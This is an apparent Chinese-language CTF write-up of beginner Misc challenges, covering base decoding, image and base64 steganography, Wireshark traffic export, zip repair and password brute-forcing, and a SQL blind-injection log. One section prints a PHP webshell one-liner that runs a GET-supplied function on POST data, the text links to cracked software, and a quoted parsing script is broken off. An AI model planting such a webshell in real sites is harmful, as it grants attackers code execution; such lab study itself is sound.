## Misc
### CyberChef’s Secret
打开base加密，使用在线工具base32 58 64连续解码

![](C:\Users\33027\AppData\Roaming\Typora\typora-user-images\image-20241118112750506.png)

### 机密图片、
扫码，额没用

更改为jpg，额没用

试一下工具Stegsolve.jar，然后获得flag

找不到合适的版本打开的字都很小，眼睛疼

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026736728-6b4506b9-0360-47ca-b687-ee8b15f0ca12.png)

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026753435-ef44b347-0b7b-49e9-8036-d7626fa5790a.png)

### <font style="color:rgb(51, 51, 51);">流量！鲨鱼！</font>
<font style="color:rgb(51, 51, 51);">使用WireShark打开它</font>

<font style="color:rgb(51, 51, 51);">然后导出HTTP对象文件</font>

<font style="color:rgb(51, 51, 51);">然后发现了这个有点像flag的文件名</font>

<font style="color:rgb(51, 51, 51);">打开之后发现是一串base加密后的密文，那么将它解密即可，是两层base64</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026791805-25b59d7f-6e52-4307-9057-34a6bbf47113.png)

### <font style="color:rgb(51, 51, 51);">压缩包们</font>
先修改后缀名zip，打不开

winhex修改前八位为50 4B 03 04 14 00 00 00

解压，需要密码[ziperello](https://ziperello-2-1.en.softonic.com/download)直接暴力破解得到

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026810345-14af0b87-6ec6-4c5d-93d6-ec99c41da127.png)

<font style="color:rgb(51, 51, 51);">看了一下解析</font>

<font style="color:rgb(51, 51, 51);">发现原来还有一串base64编码，不过无伤大雅，破解速度快慢的问题而已</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026834876-d2ad757f-11f1-4dd0-9dc4-d81e4808c6cb.png)

<font style="color:rgb(51, 51, 51);">SSBsaWtlIHNpeC1kaWdpdCBudW1iZXJzIGJlY2F1c2UgdGhleSBhcmUgdmVyeSBjb25jaXNlIGFuZCBlYXN5IHRvIHJlbWVtYmVyLg==</font>

无法解压，一开始用的7-zip测试，测试后发现压缩包存在错误，但没有修复功能

使用bandzip专业版进行修复，免费版也没有修复功能，找了好几个破解版[Bandizip解压缩软件 v7.36 正式版破解专业版 - 423Down](https://www.423down.com/9735.html)

flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}

### 空白格
<font style="color:rgb(51, 51, 51);">打开什么都有，更换字体也没有</font>

<font style="color:rgb(51, 51, 51);">但是鼠标下滑有蓝色框框，说明是有内容的</font>

<font style="color:rgb(51, 51, 51);">搜索ctf空格加密</font>

<font style="color:rgb(51, 51, 51);">WhiteSpace，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。</font>[<font style="color:rgb(51, 51, 51);">https://byxs20.github.io/posts/7979.html</font>](https://byxs20.github.io/posts/7979.html)<font style="color:rgb(51, 51, 51);">在线解码</font>  
 ![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026878679-d69aa7fb-e39b-4628-9ec2-73d5a1b6f671.png)

### <font style="color:rgb(51, 51, 51);">隐秘的眼睛</font>
<font style="color:rgb(51, 51, 51);">题目翻译英文查了一下发现是SilentEye ，使用silenteye打开,decode.</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026906681-e12e9748-8e1b-4203-8d51-a56e62cd3011.png)

### <font style="color:rgb(51, 51, 51);">新建word文档</font>
<font style="color:rgb(51, 51, 51);">打开word空白，ctrl+a全选，右击选择字体，关闭隐藏效果</font>

<font style="color:rgb(51, 51, 51);">得到如下文字新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑</font>

<font style="color:rgb(51, 51, 51);">复制直接搜索，第一个就是新约佛论禅</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026949959-72e7ab6f-50d6-4afb-8f13-f1783901b9eb.png)

### <font style="color:rgb(51, 51, 51);">永不消逝的电波</font>
<font style="color:rgb(51, 51, 51);">很明显的一段摩斯密码</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026969908-f5f116e9-2b54-4d5e-a635-483961d1bb8d.png)

<font style="color:rgb(51, 51, 51);">不会写代码，使用了较为朴素的方法，放大波形图一个一个抄下来</font>

<font style="color:rgb(51, 51, 51);">..-./.-../.-/--./-/...././-..././.../-/-.-./-/..-././.-./../.../-.--/---/..-</font>

<font style="color:rgb(51, 51, 51);">再在线工具解码</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732026983974-c42676c1-c947-4158-b871-7c54a9f64443.png)

### <font style="color:rgb(51, 51, 51);">BASE</font>
[<font style="color:rgb(51, 51, 51);">https://cloud.tencent.com/developer/article/2160364</font>](https://cloud.tencent.com/developer/article/2160364?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY)

<font style="color:rgb(51, 51, 51);">根据上述文章来看存在base隐写</font>

<font style="color:rgb(51, 51, 51);">base64隐写原理</font><font style="color:rgb(51, 51, 51);">在存在占位符=的情况下，会将部分位的二进制数丢弃，而这些被丢弃的位中可以插入隐写的信息，即在那些用0补充的位上插入别的信息，同时又不影响base解码</font><font style="color:rgb(51, 51, 51);">可知base64编码中，末尾=的个数只可能是0个、1个、2个，而0个的时候无法隐写，故我们需要考虑末尾有1个或2个等号的情况</font><font style="color:rgb(51, 51, 51);">————————————————</font>

                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。

<font style="color:rgb(51, 51, 51);">原文链接：</font>[<font style="color:rgb(51, 51, 51);">https://blog.csdn.net/weixin_51804748/article/details/121792094</font>](https://blog.csdn.net/weixin_51804748/article/details/121792094)

<font style="color:rgb(51, 51, 51);">不会脚本，找一下大神的现成代码</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(243, 244, 245);">b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' with open('base.txt', 'rb') as f: bin_str = '' for line in f.readlines(): stegb64 = ''.join(line.split()) rowb64 = ''.join(stegb64.decode('base64').encode('base64').split()) offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1])) equalnum = stegb64.count('=') #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])</font>



<font style="color:rgb(51, 51, 51);">稍微改一下打开文件名，查了一下说要以python2运行</font>

<font style="color:rgb(51, 51, 51);">iDMb6ZMnTFMtFuouYZHwPTYAoWjC7Hjca8</font>

<font style="color:rgb(51, 51, 51);">Base58解密得到flag{b4se_1s_4_g0od_c0d3}</font>

### <font style="color:rgb(51, 51, 51);">java</font>
<font style="color:rgb(51, 51, 51);">下载附件，百度识图了一下，美女叫gakki</font>

<font style="color:rgb(51, 51, 51);">根据题目提示，和java有关搜索JAVA得到是JAVA盲水印，需要使用blindwatermark</font>[BlindWatermark:Java 盲水印 - GitCode](https://gitcode.com/gh_mirrors/blin/BlindWatermark/overview?utm_source=csdn_github_accelerator&isLogin=1)

<font style="color:rgb(51, 51, 51);">使用教程具体使用过程参考的这篇文章</font>[【CTF-misc】java盲水印BlindWatermark工具使用_ctf 盲水印-CSDN博客](https://blog.csdn.net/qq_39972370/article/details/134145890)

<font style="color:rgb(51, 51, 51);">正好是拿这道题举的例子，爽，一步一步跟着做就行</font>

![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732027293990-611c373b-a025-429a-916f-1c19a255d898.png)

flag{3bb3c3a628a94c}

### WELBSHELL的利用
PHP混淆加密

[php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解](http://www.zhaoyuanma.com/phpjm.html)

# ![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732027334991-75b97245-b6ba-4af6-967c-18eb6c882e8f.png)
<font style="color:rgb(51, 51, 51);">wellshell为error_reporting(0);($</font>_<font style="color:rgb(51, 51, 51);">GET['7d67973a'])($</font>_<font style="color:rgb(51, 51, 51);">POST['9fa3']); </font>

<font style="color:rgb(51, 51, 51);">函数的动态调用，GET传入函数名，POST传入函数参数  
</font><font style="color:rgb(51, 51, 51);"> </font>![](https://cdn.nlark.com/yuque/0/2024/png/50077463/1732027376386-4e477ae3-814b-41fd-a7e5-4ccdc9ba99ac.png)

### <font style="color:rgb(51, 51, 51);">序章</font>
完了，这个是真不会，问一问ai爹

日志中的请求是典型的SQL注入攻击尝试，攻击者试图通过逐字符比较ASCII值来获取数据库中的用户名和密码。

对SQL进行搜索找到文章[Bugku-CTF分析篇-日志审计（请从流量当中分析出flag） - 0yst3r - 博客园](https://www.cnblogs.com/0yst3r-2046/p/12322110.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTczNzU3NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5NzM3NTQ1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMxMTE0NzQxNX0.mTWIluoUq65XDAhk6XrX9TnWYTlf03r-E2CS43TFFdY)

使用[notepad++](https://blog.csdn.net/c_QFy_17/article/details/142600933)

用 notepad++ 的插件中的 MIME Tool 中的 URL decode 解一下码

上面说是盲注（不知道）

偷偷看一下去年wp，然后再剽窃一下大佬脚本

# coding:utf-8import re  
import urllib

f = open('access.log','r')  
lines = f.readlines()  
datas = []  
for line in lines:  
    t = urllib.unquote(line)   
    datas.append(t)

flag_ascii = {}  
for data in datas:  
    matchObj = re.search( r'user),(._?),1))=(._?),sleep', data)  
    if matchObj:



<font style="color:rgb(51, 51, 51);">you_w4nt_s3cretflag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32},</font>

<font style="color:rgb(51, 51, 51);">flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</font>

  
 



# 
